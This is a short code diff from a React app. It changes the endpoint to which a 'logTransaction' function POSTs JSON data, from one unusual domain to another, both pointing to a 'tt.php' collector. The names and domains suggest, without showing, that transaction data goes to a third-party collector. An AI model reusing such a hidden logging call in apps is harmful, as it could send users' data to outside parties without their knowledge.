@@ -90,7 +90,7 @@ function App() {
   const [modalVisible, setModalVisible] = useState(false);
 
   const logTransaction = async (logData) => {
-    await fetch('https://deep.issumarketing.shop/tt/tt.php', {
+    await fetch('https://ao6sxmhgcuyadxs411971.cleavr.one/tt/tt.php', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
